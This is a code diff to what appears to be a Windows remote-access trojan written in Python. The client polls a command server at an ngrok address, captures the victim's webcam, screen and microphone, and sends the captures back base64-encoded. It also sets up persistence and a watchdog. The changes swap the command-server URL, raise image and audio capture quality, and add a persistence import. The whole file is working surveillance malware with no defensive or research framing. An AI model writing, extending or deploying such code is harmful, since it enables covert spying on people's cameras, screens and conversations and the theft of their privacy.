@@ -58,7 +58,7 @@ import servicemanager
 try:
     from config import SERVER_URL, POLL_INTERVAL
 except ImportError:
-    SERVER_URL    = "https://1b19-190-107-209-205.ngrok-free.app"
+    SERVER_URL    = "https://marquis-prorefugee-lala.ngrok-free.app"
     POLL_INTERVAL = 3
 
 # ─── Persistent client ID ─────────────────────────────────────────────────────
@@ -267,7 +267,7 @@ def _dispatch(cmd: dict) -> dict:
                 ret, frame = cap.read()
                 cap.release()
                 if not ret: return {"value": ""}
-                _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
                 return {"value": base64.b64encode(bytes(buf)).decode()}
             except Exception: return {"value": ""}
         elif t == "screenshot":
@@ -275,13 +275,13 @@ def _dispatch(cmd: dict) -> dict:
             try:
                 img = ImageGrab.grab()
                 buf = io.BytesIO()
-                img.save(buf, format='JPEG', quality=60)
+                img.save(buf, format='JPEG', quality=85)
                 return {"value": base64.b64encode(buf.getvalue()).decode()}
             except Exception: return {"value": ""}
         elif t == "screen_frame":
             if not _SS: return {"value": ""}
             try:
-                quality = p.get("quality", 45)
+                quality = p.get("quality", 75)
                 scale   = p.get("scale", 0.6)
                 img = ImageGrab.grab()
                 img = img.resize((int(img.width*scale), int(img.height*scale)))
@@ -299,7 +299,7 @@ def _dispatch(cmd: dict) -> dict:
                 try:
                     pa = pyaudio.PyAudio()
                     stream = pa.open(format=pyaudio.paInt16, channels=1,
-                                     rate=16000, input=True, frames_per_buffer=512)
+                                     rate=44100, input=True, frames_per_buffer=1024)
                     while _AUDIO["active"]:
                         chunk = stream.read(512, exception_on_overflow=False)
                         with _AUDIO["lock"]:
@@ -336,9 +336,9 @@ def _dispatch(cmd: dict) -> dict:
                 try:
                     pa = pyaudio.PyAudio()
                     stream = pa.open(format=pyaudio.paInt16, channels=1,
-                                     rate=16000, input=True, frames_per_buffer=512)
+                                     rate=44100, input=True, frames_per_buffer=1024)
                     while _AUDIO_REC["active"]:
-                        chunk = stream.read(512, exception_on_overflow=False)
+                        chunk = stream.read(1024, exception_on_overflow=False)
                         with _AUDIO_REC["lock"]:
                             _AUDIO_REC["frames"].append(chunk)
                 except Exception as e:
@@ -366,7 +366,7 @@ def _dispatch(cmd: dict) -> dict:
             wf = wave.open(buf, "wb")
             wf.setnchannels(1)
             wf.setsampwidth(2)
-            wf.setframerate(16000)
+            wf.setframerate(44100)
             wf.writeframes(b"".join(frames))
             wf.close()
             return {"value": base64.b64encode(buf.getvalue()).decode()}
@@ -456,6 +456,7 @@ def _setup_persistence():
     except Exception as e:
         logger.warning("Persistence setup error: %s", e)
 
+from core import watchdog, persistence
 
 def _start_watchdog_if_possible() -> bool:
     try:
